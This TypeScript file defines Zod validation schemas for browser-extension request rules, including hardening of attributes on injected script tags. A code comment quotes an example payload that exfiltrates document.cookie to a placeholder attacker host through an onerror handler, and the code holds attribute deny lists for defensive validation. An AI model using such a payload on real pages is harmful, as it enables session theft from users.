import { z } from 'zod';

export const SourceSchema = z.object({
  key: z.enum(['Url', 'Host', 'Path']).describe('Source key for matching: Url, Host, or Path.'),
  operator: z.enum(['Equals', 'Contains', 'Matches', 'Wildcard_Matches']).describe('Operator for matching: Equals, Contains, Matches, or Wildcard_Matches.'),
  value: z.string().describe('Value to match against.'),
  filters: z.array(
    z.object({
      requestMethod: z.array(z.string()).optional().describe('Array of allowed HTTP methods for matching.'),
      requestPayload: z.object({
        key: z.string().describe('Key in the request payload.'),
        value: z.string().describe('Value for the request payload key.'),
      }).optional().describe('Request payload filter.'),
    })
  ).optional().describe('Array of filter objects for advanced matching.'),
}).describe('Source matching criteria for a rule.');

// All pair schemas...
export const RedirectPairSchema = z.object({
  source: SourceSchema,
  destinationType: z.string().describe('Type of destination for redirect.'),
  destination: z.string().describe('Target URL for redirect.'),
}).describe('Redirect rule pair: source and destination info.');

export const CancelPairSchema = z.object({
  source: SourceSchema,
}).describe('Cancel rule pair: source info only.');

export const ReplacePairSchema = z.object({
  source: SourceSchema,
  from: z.string().describe('String to replace.'),
  to: z.string().describe('Replacement string.'),
}).describe('Replace rule pair: source, from, and to info.');

export const HeaderModificationSchema = z.object({
  header: z.string().describe('Header name to modify.'),
  type: z.enum(['Add', 'Remove', 'Modify']).describe('Modification type: Add, Remove, or Modify.'),
  value: z.string().optional().describe('Optional value for header modification.'),
}).describe('Header modification details.');

export const HeadersPairSchema = z.object({
  source: SourceSchema,
  modifications: z.object({
    Request: z.array(HeaderModificationSchema).optional().describe('Request header modifications.'),
    Response: z.array(HeaderModificationSchema).optional().describe('Response header modifications.'),
  }).describe('Header modifications for request/response.'),
}).describe('Headers rule pair: source and modifications.');

export const UserAgentPairSchema = z.object({
  source: SourceSchema,
  userAgent: z.string().describe('Custom user agent string.'),
}).describe('User agent rule pair: source and user agent.');

export const QueryParamModificationSchema = z.object({
  param: z.string().describe('Query parameter name.'),
  type: z.enum(['Add', 'Remove', 'Remove All']).describe('Modification type for query param.'),
  value: z.string().optional().describe('Optional value for query param modification.'),
}).describe('Query parameter modification details.');

export const QueryParamPairSchema = z.object({
  source: SourceSchema,
  modifications: z.array(QueryParamModificationSchema).describe('Array of query parameter modifications.'),
}).describe('Query parameter rule pair: source and modifications.');

export const RequestPairSchema = z.object({
  source: SourceSchema,
  request: z.object({
    type: z.enum(['code', 'static']).describe('Request type: code or static.'),
    value: z.string().describe('Request content.'),
  }).describe('Request details.'),
}).describe('Request rule pair: source and request.');

export const ResponsePairSchema = z.object({
  source: SourceSchema,
  response: z.object({
    type: z.enum(['code', 'static']).describe('Response type: code or static.'),
    value: z.string().describe('Response content.'),
    resourceType: z.string().optional().describe('Optional resource type for response.'),
    statusCode: z.union([z.string(), z.number()]).optional().describe('Optional status code for response.'),
    statusText: z.string().optional().describe('Optional status text for response.'),
    serveWithoutRequest: z.boolean().optional().describe('Whether to serve response without request.'),
  }).describe('Response details.'),
}).describe('Response rule pair: source and response.');

export const DelayPairSchema = z.object({
  source: SourceSchema,
  delay: z.string().refine((val) => /^\d+$/.test(val), {
    message: 'Delay must be a string containing a number',
  }).describe('Delay value in milliseconds (stringified number).'),
}).describe('Delay rule pair: source and delay.');

/**
 * RQ-3024 (F-022) — attribute channel on injected <script> tags.
 *
 * The Requestly browser extension applies every name/value pair here as an HTML
 * attribute on the script tag it injects into the page. With both fields as bare
 * z.string(), the rendered tag could be
 *   <script src="https://evil/x.js" onerror="fetch('https://evil/c?d='+document.cookie)">
 * while scripts[].value stayed a benign comment. That matters because it defeats
 * the obvious review: a human approving a rule at the confirmActivation prompt
 * reads the script BODY, not the attribute list.
 *
 * Both halves of the channel are closed:
 *   name  — allowlisted. An allowlist (not a denylist) means a future HTML
 *           attribute with execution semantics is refused by default.
 *   value — cannot contain the characters that break out of a quoted attribute.
 *           Constraining only `name` would leave the identical bypass open via
 *           value: name="data-x", value='" onerror="…' renders as
 *           <script data-x="" onerror="…">.
 *
 * Comparison is trimmed and lowercased because HTML attribute names are
 * case-insensitive — "SRC" and " OnError " are the same sink as "src"/"onerror".
 */
const SAFE_SCRIPT_ATTRIBUTE_NAMES = new Set([
  'async',
  'crossorigin',
  'defer',
  'integrity',
  'nonce',
  'referrerpolicy',
  'type',
]);

/** `data-*` custom attributes carry no execution semantics. */
const DATA_ATTRIBUTE_PATTERN = /^data-[a-z0-9]+(-[a-z0-9]+)*$/;

/**
 * Named explicitly so the refusal is self-documenting and testable, even though
 * the allowlist above already excludes them.
 */
const FORBIDDEN_SCRIPT_ATTRIBUTE_NAMES = new Set([
  'action',
  'formaction',
  'href',
  'src',
]);

export const isSafeScriptAttributeName = (rawName: string): boolean => {
  const name = rawName.trim().toLowerCase();
  // Any event handler (onerror, onload, onanimationstart, …) is an execution sink.
  if (/^on/.test(name)) {
    return false;
  }
  if (FORBIDDEN_SCRIPT_ATTRIBUTE_NAMES.has(name)) {
    return false;
  }
  return SAFE_SCRIPT_ATTRIBUTE_NAMES.has(name) || DATA_ATTRIBUTE_PATTERN.test(name);
};

/** Characters that terminate a quoted HTML attribute or open a new tag. */
const ATTRIBUTE_BREAKOUT_CHARS = /["'<>`]/;

export const isSafeScriptAttributeValue = (value: string): boolean =>
  !ATTRIBUTE_BREAKOUT_CHARS.test(value);

export const ScriptAttributeSchema = z.object({
  name: z
    .string()
    .refine(isSafeScriptAttributeName, {
      message:
        'Unsupported script attribute name. Allowed: async, crossorigin, defer, integrity, ' +
        'nonce, referrerpolicy, type, or data-*. Event handlers (on*) and src/href/action/' +
        'formaction are rejected because they execute code or redirect the script source.',
    })
    .describe(
      'Attribute name. Must be one of async, crossorigin, defer, integrity, nonce, ' +
        'referrerpolicy, type, or a data-* attribute. on*/src/href/action/formaction are rejected.'
    ),
  value: z
    .string()
    .refine(isSafeScriptAttributeValue, {
      message:
        'Script attribute value must not contain quotes, angle brackets or backticks — ' +
        'those characters can break out of the rendered attribute and inject a new one.',
    })
    .describe('Attribute value. Must not contain " \' < > or `.'),
}).describe('Custom HTML attribute to add to the injected script tag.');

export const ScriptModificationSchema = z.object({
  codeType: z.enum(['js', 'css']).describe('Script language: js or css.'),
  value: z.string().describe('Script content or URL depending on type.'),
  loadTime: z.enum(['beforePageLoad', 'afterPageLoad']).describe('When to load the script: beforePageLoad or afterPageLoad.'),
  type: z.enum(['url', 'code']).describe('Script value type: url (external script URL) or code (inline script).'),
  attributes: z.array(ScriptAttributeSchema).optional().describe('Optional array of custom HTML attributes to add to the injected script tag.'),
}).describe('Script modification details.');

export const ScriptPairSchema = z.object({
  source: SourceSchema,
  scripts: z.array(ScriptModificationSchema).describe('Array of script modifications to inject.'),
}).describe('Script rule pair: source and scripts to inject.');

// Rule type enum
export const RuleTypeEnum = z.enum([
  'Redirect',
  'Cancel',
  'Replace',
  'Headers',
  'UserAgent',
  'Script',
  'QueryParam',
  'Request',
  'Response',
  'Delay',
]).describe('Enumeration of all supported rule types.');